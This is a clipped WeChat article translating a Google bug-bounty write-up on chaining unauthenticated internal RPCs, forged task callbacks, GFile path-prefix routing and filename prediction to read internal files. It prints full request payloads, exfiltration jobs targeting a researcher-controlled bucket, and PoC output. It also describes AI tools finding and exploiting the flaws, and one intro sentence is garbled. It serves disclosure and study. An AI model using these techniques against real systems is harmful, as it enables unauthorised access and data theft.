---
title: 【微信】攻破 Google GFile 拿满 10 万美元：通用 RPC 路由 + 跨存储前缀 + 文件名预测组合拳
source: https://mp.weixin.qq.com/s/bBQwm7hHqxb8i35Ij0v9lg
source_host: mp.weixin.qq.com
clip_date: 2026-10-13T09:19:33+08:00
trace_id: bc5dfc85-2263-413b-9d78-7ff2452a95f0
content_hash: 7f07b83d805a218d2d79479aed939992a8b5de4ced00da165fea26642e895e53
status: synced
tags:
  - 微信
  - 漏洞分析
  - 协议分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Google 内部 RPC 存在无鉴权 + GFile 路径前缀路由绕过 + 临时文件名可预测三重缺陷，组合后实现任意内部文件读取，两报告共获奖 97,604 美元。
ai_summary_style: key-points
images_status:
  total: 5
  succeeded: 5
  failed_urls: []
notion_page_id: 3f875244-d011-8148-a583-f1979f60ae4b
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Google 内部 RPC 存在无鉴权 + GFile 路径前缀路由绕过 + 临时文件名可预测三重缺陷，组合后实现任意内部文件读取，两报告共获奖 97,604 美元。
> 
> - **RPC 入口：** 无 HTTP 映射的 Google 内部 RPC 仍可经通用路由 `/$rpc/<服务名>/<方法>` 访问，因此不出现在 discovery 文档中，成为被忽视的攻击面；firefly-pa 上的 StudioManagement、TaskManagerService 等 admin RPC 完全缺失鉴权，可 dump 合作方记录（含明文密码）。
> - **伪造 worker 回调：** `NotifyTaskExecutionResult` 不校验调用方身份，直接谎报 dummy task 为 COMPLETE_SUCCESS，即可让调度器执行依赖它的 copy 任务；把 bucket 设为禁止删除可避免文件被后端执行后清除。
> - **跨存储前缀绕过：** `copyFileTask` 的 `bigstoreIdentifier` 字段只是误导命名，路径字符串原样交给 GFile，前缀决定 FileFactory 后端（/bigstore/、/cns/、/ls/、/blobstore/ 等），可读 `/etc/passwd.borg`（百万行 LDAP）、经 `/ls/` 查 Chubby 解析 BNS 地址，并以 `play-movies-encoding` 生产身份执行。
> - **文件名预测：** Mamba `/v1/process` 无鉴权，错误响应泄漏完整 CNS 临时目录与命名规则 `tempfile-<host>-<tid>-<pid>-<cycle>-<wall>`；用 `/batch` 把成功 copy 夹在大量失败 copy 间固定同一 borgtask，按 worker id gap 插值 wall、预测 cycle 生成候选，用「文件是否存在」oracle 在第 771,000 条命中。
> - **结果与根因：** Firefly 奖励 60,000 美元、Mamba 37,604.40 美元；根因是调用方未对 GFile 路径前缀做白名单校验，类似缺陷可能存在于其他 Google API。

**黑白之道** *2026年10月13日 09:00*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eeb836fa6d77631e.png)

> **导语**：本文转载编译自 Google Bug Hunters 博客 2026-09-11 发布的《Breaking into Google's GFile for 97,604，分别为 Firefly 报告 37,604.40。下面按原始章节顺序把技术细节原汁原味译出，仅作少量语序与中文习惯性调整，便于中文读者阅读。

![GFile 跨存储攻击全景图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8b7d4513bf7e22ea.png "GFile 跨存储攻击全景图")

* * *

## 背景：上一篇关于"AI 扫 discovery 文档"的延续

在我上一篇文章里，我详细讲了怎么用 AI 大规模扫 Google 基础设施里的 discovery 文档，顺手摸出一堆 bug。那篇发出去之后我估计这条面会被盯紧，所以我想换个新打法。

我意识到 Google 内部的 API 端点本质上都是 RPC，很多并没有自定义 HTTP 映射，因此根本不会出现在 discovery 文档里。但即使没有 HTTP 映射，这些 RPC 仍然可以走通用 RPC 路由访问：

```
/$rpc/<fully-qualified-service-name>/<method>
```

比如：

```
/$rpc/google.internal.play.movies.firefly.avails.v1.AvailService/ListAvails
```

既然这条面没怎么被翻过，我就专门去盯它。discovery 文档拿不到，我得用其他办法"挤"出端点的 protobuf 参数，比如 req2proto。

我的 AI 工具最先发现的一个 API 是 `firefly-pa.googleapis.com` 。它里头挂了一堆管理 YouTube TV/Film 合作方记录的 admin RPC，对应的账号是 Content Manager 账号。这种账号能直接在 YouTube 上做 strike、下发 monetization 之类的版权动作，权限极高。结果一看， **鉴权检查根本没有**。

## 一、把每个合作方的 CMS 记录全部 dump 出来

用这套 RPC 可以把任何一个工作室记录拉出来，里面有内部联系信息、Content Manager 邮箱、内部备注——甚至包含明文密码：

**请求**

```yaml
POST /$rpc/google.internal.play.movies.firefly.backdraft.v2.StudioManagement/GetStudio?alt=json HTTP/2
Host: firefly-pa.clients6.google.com
Cookie: <REDACTED>
Authorization: <REDACTED>
X-Goog-Api-Key: AIzaSyAFwUqVJym0bGjT348m643asjdULk6gfe4
Origin: https://partnerdash.google.com
Content-Type: application/x-protobuf

ChBlZmU2ODAwMDAwMDAwMDAw
```

解码后的请求体： `{1: studio_id="efe6800000000000"}`

**响应**

```json
{
  "studioId":"efe6800000000000",
"displayName":"<REDACTED>",
"hellboyId":"100299624",
"flareId":"1",
"searchLabel":"<REDACTED>",
"primaryInternalContact":"playsupport-moviestv",
"externalContacts":[
    {
      "email":"<REDACTED>",
      "contactRole":"<REDACTED>",
      "contentType":"CONTENT_TV",
      "regions":["APAC"],
      "countries":["AU"],
      "name":"<REDACTED>",
      "preferredLanguage":"LANG_EN_AU"
    }
],
"notes":"New Salesforce Alias: <REDACTED>@google.com, <REDACTED>@google.com\n<REDACTED>@google.com\nPO 417174\n\nMy <REDACTED> Files (box) access: https://<REDACTED>.account.box.com/login  <REDACTED>@google.com, password: <REDACTED> ..."
}
```

同一个 API 上所有 RPC 全都是同样的鉴权缺失。可以列出数百万条 avails 和 ingestion job，可以 dump 别人的 transaction/order 记录，甚至能改、删别人的 avails、prepared avails、transaction。

## 二、那个永远不执行的 Job

但其中最引起我注意的一组 RPC 是：

```
TaskManagerService
  CreateJob
  GetJob
  GetJobStatusLog
  GetTask
  GetTaskStatusLog
  GetTaskExecutionResult
  RestartTask
  NotifyTaskExecutionResult
```

看 `/TaskManagerService.CreateJob` 表面，它支持一个 `copyFileTask` ，可以用一个用户传入的 Bigstore/Blobstore 路径，复制到另一个用户传入的路径：

```java
message CopyFileTask {
string task_id = 3;
  FileIdentifier src_file = 1;
  FileIdentifier dest_file = 2;
bool overwrite = 4;
}

message FileIdentifier {
oneof identifier_oneof {
    BigstoreIdentifier bigstore_identifier = 1;
    BlobstoreIdentifier blobstore_identifier = 2;
  }
}
```

从该 API 的其他 RPC 里我看到一些敏感的内部 Bigstore 路径，例如：

```
/bigstore/ypc-archive/package/3fbfaacf9e28dcef33214599153846/resources/Google_JusticeLeague_2951533_FE_RLI-10269600.36058659747131.36047781510202.xml
```

如果能把这些文件拷一份到我自己的 GCS bucket，就能直接读。

> Bigstore 是 Google Cloud Storage（GCS）的内部代号。

第一次尝试我只发了一条 job 把目标文件拷到自己 bucket。 `CreateJob` 接受了，返回了两个 server 分配的 task id，但 job 一直卡在 `NEW` 状态。我注意到 `CreateJobRequest` 里可以指定 "dependent tasks"，或许配上依赖就能跑起来？

```java
message Job {
string job_id = 1;
  JobClientInfo client_info = 5;
repeated Task tasks = 2;
repeated Dependency dependencies = 3;
  ExecutionStatus job_status = 4;
}

message Dependency {
repeatedstring in_task_names = 1;
repeatedstring in_task_ids = 3;
string out_task_name = 2;
string out_task_id = 4;
}
```

于是我建了一个带两个 task 的 job： `dummy` 在自己 bucket 里拷一份无害文件， `exfil` 把目标文件拷到 bucket；依赖关系让 `exfil` 必须在 `dummy` 完成后才跑：

```json
{
  "job":{
    "clientInfo":{"client":"JOB_CLIENT_ASSET_MANAGER","clientId":"vrp"},
    "tasks":[
      {
        "taskName":"dummy",
        "copyFileTask":{
          "srcFile":{"bigstoreIdentifier":{"filePath":"/bigstore/my-public-writeable-vrp-bucket/poc/pred.txt"}},
          "destFile":{"bigstoreIdentifier":{"filePath":"/bigstore/my-public-writeable-vrp-bucket/poc/pred.txt"}},
          "overwrite":true
        }
      },
      {
        "taskName":"exfil",
        "copyFileTask":{
          "srcFile":{"bigstoreIdentifier":{"filePath":"/bigstore/ypc-archive/package/example"}},
          "destFile":{"bigstoreIdentifier":{"filePath":"/bigstore/my-public-writeable-vrp-bucket/poc/exfil.xml"}},
          "overwrite":true
        }
      }
    ],
    "dependencies":[{"inTaskNames":["dummy"],"outTaskName":"exfil"}]
}
}
```

**响应**

```json
{
  "jobId": "2030d1a000000000",
  "tasks": [
    {"taskName":"dummy","copyFileTask":{"taskId":"a030d1a000000000"}},
    {"taskName":"exfil","copyFileTask":{"taskId":"6030d1a000000000"}}
  ]
}
```

依然卡在 `NEW` 。换什么姿势都跑不起来。 `RestartTask` 也只是返回一个 5xx 错误，并没有真执行。

从这组 RPC 看， `TaskManagerService` 显然是某种由其他服务（如 `AssetManagerService` ）调用的内部服务，我大概漏掉了真正触发任务的入口。 `AssetManagerService` 这边也找不到可以触发任意 task 的口子，这条路暂时断掉，把当时掌握的所有信息打包发给 Google VRP。

## 三、把状态从 NEW 拽出来

隔了一天我决定再碰碰运气，让 AI 工具自己想办法把 task 跑起来。

它发现 `NotifyTaskExecutionResult` 是 worker 上报"任务完成"的回调 RPC，但 **完全不验证调用方就是分配到那个 task 的 worker**。既然 `exfil` 依赖 `dummy` ，我可以直接调用这个 RPC，把 server 分配的 `dummy` task 谎报成 `STATUS_COMPLETE_SUCCESS` ：

```json
{
  "taskId":"a030d1a000000000",
"status":{"status":"STATUS_COMPLETE_SUCCESS"},
"copyFileTaskExecutionResult":{
    "destFiles":{
      "bigstoreIdentifier":{
        "filePath":"/bigstore/my-public-writeable-vrp-bucket/poc/pred.txt"
      }
    }
}
}
```

scheduler 信了这个伪造的回调，把 `dummy` 标成 complete，然后去调度真正依赖它的 `exfil` task 到生产后端。

任务执行了，但文件没有停留在我 bucket 里。多试几次发现诡异现象：文件先被创建，紧接着就被删除。我写了个脚本去 race 这一段，终于把文件抠出来：

```html
curl 'https://storage.googleapis.com/my-public-writeable-vrp-bucket/poc/exfil.xml'
# HTTP 200  (2,270,337 bytes)
# <?xml version="1.0" encoding="UTF-8"?>
# <DolbyLabsMDF xmlns="http://www.dolby.com/schemas/dvmd/4_0_2"> ...
```

后来发现一个更干净的姿势：把 bucket 权限设成只允许 `allUsers` 读 + 上传，不允许删。后端执行完后想删也删不掉。

![Firefly 三步攻击链](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e34b854f5e9c167b.png "Firefly 三步攻击链")

## 四、Bigstore 只是 GFile 冰山一角

能把 Bigstore 读出来已经很有趣，但我还想看看能不能打到别的服务。Google 内部有一个文件库叫 **GoogleFile（GFile）**，它在不同存储系统前套一层通用接口，由 `FileFactory` 根据路径前缀选真正的后端。这意味着同一个 copy 函数只要二进制里链接到对应实现，就能操作 Bigstore（GCS 的内部名）、Blobstore、CNS（Colossus）、Chubby，甚至 borgtask 的本地文件系统。

上一节 task 响应里的 `bigstoreIdentifier` 用的是 `/bigstore/` 前缀。如果换成别的会怎样？字段名其实是个误导——只要 `copyFileTask` 把用户传入的字符串原样交给 GFile，换前缀就能决定真正打到哪个后端。

试了几条前缀， **还真成了**：

| FileFactory | 响应  |
| --- | --- |
| `/bigstore/` | Empty bucket name |
| `/blobstore/` | Invalid path |
| `/cns/` | unable to parse path: invalid cell name:; '/cns/'; Open on /cns/ |
| `/ls/` | LockService OpenExisting error: /ls: access denied |
| `/cfs/` | unable to parse path: invalid file factory prefix: /cfs; Open on /cfs/ |
| `/cfs2/` | unable to parse path: invalid file factory prefix: /cfs2; Open on /cfs2/ |
| `/namespace/` | /namespace/: Invalid name space path/pattern: /namespace/; NamespaceFileFactory::Open |
| `/ffs/` | Unexpected faultyfs prefix: /ffs |
| `/readahead/` | Malformatted /readahead path: /readahead/ |
| `/memfile/` | File not found: /memfile/ |
| `/google_src/head/` | FileFactory '//file/google_src' not found while resolving path '/google_src/head'. The application has not been linked against the '//file/google_src' library or InitGoogle() has not been called yet. |

> 备注：FileFactory 必须链接进当前二进制才能用，例子里的 `/google_src/head/` 这个 FileFactory 没链接进来。

## 五、读和写 borgtask 本地文件

GFile 还能操作本地文件。为了验证它真的跑在 borg 上，我直接把 `/etc/passwd.borg` 当源，拷到自己 bucket。结果是直接拿到的：

```ruby
<redacted>:x:2501:5000::/user/<redacted>:/bin/bash
<redacted>:x:2503:5000::/user/<redacted>:/bin/bash
<redacted>:x:2527:5000::/user/<redacted>:/bin/bash
...
```

这个文件上百万行，装的是每个 Googler 的 LDAP。

到这里意味着没有任何沙箱隔离层（比如 gVisor），已经触达实际跑服务的物理机的文件系统。把源和目的换一下，还可以反向写任意文件。我顺手验证了一下，往 `/tmp/poc.txt` 写入了 `brutecat was here` 。

### 用 Chubby 把 Google 内部地址解出来

Chubby 是 Google 的分布式锁与命名服务，内部的协调、存一点元数据（包括服务地址）都靠它。GFile 把 Chubby 通过 `/ls/<cell>/...` 路径暴露成可查接口。一个 cell 通常就是一个 Chubby 实例，对应一个数据中心。Chubby 在 GFile 里是开着的，我顺手测了一组查询，看看 Chubby 在内部是怎么被用来解析 Borg Name Service（BNS）地址的。

Google 内部服务一般通过 GSLB 地址访问，比如 `hr.corp.googleapis.com` 实际服务在 `blade:corp-hr-api` ，这种 GSLB 在某些外部点会泄漏出来。拿一个泄漏的 `java/com/google/loadbalancer/rpc/GslbChannelPicker3.java` （来自反编译 Google 公开的二进制），可以算出 `blade:apphosting-stubbyproxy` 的 fallback Chubby 查询： `/ls/ce/loadbalancer/fallback/924/blade_apphosting-stubbyproxy` ，查出来是：

```swift
/bns/ce/borg/ce/bns/app-engine-inbound-stubby-proxy/prod-global.inbound-stubby-proxy:spp
/bns/lcscld/borg/lcscld/bns/app-engine-inbound-stubby-proxy/prod-global.inbound-stubby-proxy:spp
```

再查一个 BNS 地址，比如 `/ls/qk/borg/qk/bns/apps-drive-genoa-server/prod-stripe10.genoa-server/0` （ `0` 是 task id， `qk` 是示例 cell），会直接返回这个 borgtask 的 IPv6 地址。

### 影响面

`GetTaskStatusLog` 显示这次 copy 是以 `play-movies-encoding@system.gserviceaccount.com` 这个生产身份执行的，能访问 GFile 的所有后端：Bigstore（GCS）、Blobstore、CNS（Colossus，Google 绝大多数服务都跑在它上面）、Chubby，等于对 Google 这套可扩展存储体系拿到一个几乎完整的读权限。我把这个升级面同步给 Google 后，报告很快被升到 P0。

我以为 GFile 这条线就这么结了。没想到三天之后又找到了第二个。

## 六、有复制原语但拿不到输出

`staging-mamba-backend.sandbox.googleapis.com` 这个端点我盯了很久了。它暴露了一个无认证的 `/v1/process` ，接收用户传的 `refFilename` ，把文件复制到一个临时 CNS 目录里，给 Mamba UI 的 frame-metrics 流水线用。

拿一个后端读不到的文件去试，会回一份特别详细的错误：

**请求**

```
POST /v1/process HTTP/2
Host: staging-mamba-backend.sandbox.googleapis.com
Content-Type: application/json

{"refFilename":"/etc/shadow"}
```

**响应**

```json
{
  "error": "Copying /etc/shadow to /cns/iu-d/home/video-pipeline-metrics/mamba_ui/frame_metrics_tmp_dir/ttl=7d/tempfile-6d1b3bec58af19f2-8e5eb16870b.borgtask.google.com-151cc3-1243617-2fcfc29258853-656ebf3e9ce1d failed with error: open failed for /etc/shadow: Permission denied"
}
```

这条错误回吐把 **完整的目标路径** 都暴露了。输出的目标目录长这样：

```
/cns/iu-d/home/video-pipeline-metrics/mamba_ui/frame_metrics_tmp_dir/ttl=7d/
```

这目录一看就有问题：共享的 `frame_metrics_tmp_dir` ，TTL 7 天；路径里没有用户/租户标识；文件名也不是 UUID。这个目录很可能是全局可读，让流水线其他阶段能消费临时文件——后来确认确实如此。

文件名看起来也是确定性生成而不是随机。每段都是处理请求那个 borgtask 的运行时元数据：

```
tempfile-<borg-host>-<tid>-<pid>-<cycle>-<wall>
```

但如果源文件存在、复制成功，端点返回的是：

```
HTTP/2 200 OK
Content-Type: application/json

{}
```

也就是说 `/etc/passwd` 能成功拷进 CNS，但响应把生成出来的文件名藏起来了——拿不到文件名就读不回。

在我刚搞定 Firefly 那条任意 GFile 读之后，这个端点突然变得特别有戏。详细错误已经证明它接受 borg 本地路径，并以 `video-pipeline-metrics@system.gserviceaccount.com` 把内容写入 CNS。如果我能恢复出成功 copy 的那个文件名，第一部分的 Firefly 原语正好可以读它。

挡住攻击者的只剩下文件名这一个变量。

## 七、用 /batch 钉死 borgtask

我和朋友 Theo 一起研究，发现不同请求生成的文件名前缀非常相似：borgtask 主机名、进程 ID 不变，变的只有线程 id、cycle 计数器、wall-clock 时间戳。

独立的 HTTP 请求可能被路由到不同 borgtask，导致文件名比较不可靠。后来我意识到这个 API 还支持 Google 标准的 `/batch` 端点， **一个 multipart batch 里的所有子请求都在同一个 borgtask 上处理**。

这就能把一次成功（被隐藏）的 copy 夹在大量故意失败的 copy 之间：

```javascript
before-0   -> /etc/shadow
before-1   -> /etc/shadow
before-2   -> /etc/shadow
...
target     -> /etc/passwd
...
after-0    -> /etc/shadow
after-1    -> /etc/shadow
after-2    -> /etc/shadow
```

任何能稳定失败的源路径都行。我直接复用 `/etc/shadow` ——它复制失败、文件名泄漏；目标 `/etc/passwd` 复制成功返回 `{}` 。所有请求都在同一台 borgtask 上执行，左右两侧的失败会把"造文件的那个进程"附近生成的兄弟文件名给吐出来。

这些 worker id 通常是一个近似连续的序列：

```
... 11617f, 116180, 116181, [missing], 116183, 116184 ...
```

中间空缺的就是成功 target 请求的候选 worker。进程里其他工作也可能造成多个 gap，所以 PoC 会重跑 batch，留 worker gap 最少、时间窗最窄的那一组。

这一步拿到的是稳定的 borg 主机 + PID，外加可能的目标线程 id + 前后两个时间邻居。剩下要做的就是预测 cycle 计数器和 wall-clock 时间戳的具体值。

到这里我把样本和路径 oracle 交给 GPT-5.6-sol（xhigh），让它直接干。它把邻近的失败样本变成一个有界搜索：

-   泄漏的文件名是按时间排列的，所以 hidden 请求的 `wall` 值可以从它前后 worker id 之间线性插值。
    
-   `cycle` 计数器大约每秒增长 1,300 个 cycle，可以从 wall clock 直接预测。
    
-   在两个估算值上加一点 jitter，几百万条候选路径就把不确定的搜索空间压成了有界集合。
    

还有一个很方便的 oracle：把候选 CNS 路径直接喂回 `/v1/process` ，存在就返回 `{}` ，不存在就报错。PoC 把候选打包到并行 `/batch` 请求里一个一个试，直到某条返回 `{}` 。

整个流程如下：

1.  在一个 `/batch` 请求里把真实 copy 夹在几十个失败 copy 中间。
    
2.  解析失败响应，恢复 borg 主机、PID、邻接的 `(tid, cycle, wall)` 样本。
    
3.  在 worker id 序列里找 gap，留搜索窗最窄的那一组 batch。
    
4.  插值算 `wall` ，预测 `cycle` ，加上 jitter 范围生成确切候选 CNS 路径。
    
5.  用 `/process` 回放候选路径，直到 existing-file oracle 返回 `{}` 。
    

跑 `/etc/passwd` 完全不需要鉴权：

```
$ python3 poc_mamba.py /etc/passwd
[*] Target: staging-mamba-backend.sandbox.googleapis.com/v1/process
[*] Copy input: /etc/passwd
[*] Authentication: none
[-] Batch attempt 1: dense worker run has 9 bounded gaps (limit 8); retrying
[+] Batch attempt 3: isolated 1 possible hidden worker(s): ee4bc; combined wall span 7,805 us
[+] Batch attempt 11: isolated 1 possible hidden worker(s): 116182; combined wall span 4,979 us
[*] Using best retained batch model with 4,979 us combined span
[*] Borg task: 6d1b3bec58af19f2-8e5eb168749.borgtask.google.com
[*] Process ID: 1066201
[*] Possible worker 116182: neighbors 116181/116183, wall 656e3cabf8fad..656e3cabfa320
[*] Streaming up to 8,988,980 candidates
[*] Tested 100,000 candidate paths
[*] Tested 200,000 candidate paths
[*] Tested 300,000 candidate paths
[*] Tested 400,000 candidate paths
[*] Tested 500,000 candidate paths
[*] Tested 600,000 candidate paths
[*] Tested 700,000 candidate paths
[+] Oracle hit after 771,000 candidates
[+] Verified CNS tempfile path:
/cns/iu-d/home/video-pipeline-metrics/mamba_ui/frame_metrics_tmp_dir/ttl=7d/tempfile-6d1b3bec58af19f2-8e5eb168749.borgtask.google.com-116182-1066201-10033873e0aa9-656e3cabfa04f
```

那个号称隐藏的输出路径，现在完完整整拿到了。

## 八、用 Firefly 把 CNS 文件读回来

Mamba 端点把文件拷进了 CNS，但没暴露 HTTP 端点让我下载。还好三天前我刚拿到一个通用的 GFile reader。

把恢复出来的路径直接喂给 Firefly PoC，就能以 `play-movies-encoding` 身份把它拷到自己 bucket：

```
$ python3 firefly_read_poc.py \
  "/cns/iu-d/home/video-pipeline-metrics/mamba_ui/frame_metrics_tmp_dir/ttl=7d/tempfile-6d1b3bec58af19f2-8e5eb168749.borgtask.google.com-116182-1066201-10033873e0aa9-656e3cabfa04f"

[+] EXFILTRATED 3870 bytes
    head: b'root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n...'
```

这两条原语合起来就是一个远程攻击者：任意本地文件读 + 拿到 `video-pipeline-metrics` 这个生产身份能访问的所有 GFile 后端。

## 九、结论

两个 bug 的源头大概率是同一个：开发只是想"在 Bigstore 之间挪个文件"，或者"拷进 CNS"，觉得用 GFile 很方便，于是就用了。Firefly 甚至把 protobuf 字段命名成 `bigstoreIdentifier` 。GFile 把路径开头当作 FileFactory 路由指令——只要调用方没显式白名单前缀，用户传入的"Bigstore 文件名"随时可能变成 CNS、Blobstore、Chubby、X20，或者其他后端路径。这类 bug 在 Google 其他 API 里估计同样存在。

## 时间线

-   2026-07-14 — Firefly 首报提交给 Google，4 小时内被接受
    
-   2026-07-18 — 同步 Firefly 的 GFile 升级面，报告升到 P0
    
-   2026-07-18 — Mamba 首报提交，9 分钟内被接受
    
-   2026-07-24 — **Firefly 评奖 $60,000**。评审理由：报告质量"Exceptional Quality"。归类为"Normal Google Applications"下的"unrestricted file system or database access"
    
-   2026-07-24 — **Mamba 评奖 $37,604.40**。评审理由：报告质量"Exceptional Quality"。归类同上；因利用难度极高、外传需要其他原语配合而降级
    

* * *

### 素材出处

本文为编译报道，原作者 Arvin Shivram（brutecat）2026-09-11 发布于 Google Bug Hunters 官方博客。

-   原文：Breaking into Google's GFile for $100k
    
-   作者主页：bughunters.google.com/profile
    
-   配套工具：req2proto
    
-   相关参考：Colossus 架构 / Chubby OSDI 2006 论文
    
-   作者前作：Hacking Google With AI
    

![作者 brutecat](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/17028d86cc5e49e3.jpg "作者 brutecat")

* * *

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/60693bec6dc25202.jpg)

> 👇 点击，访问我的网站

* * *
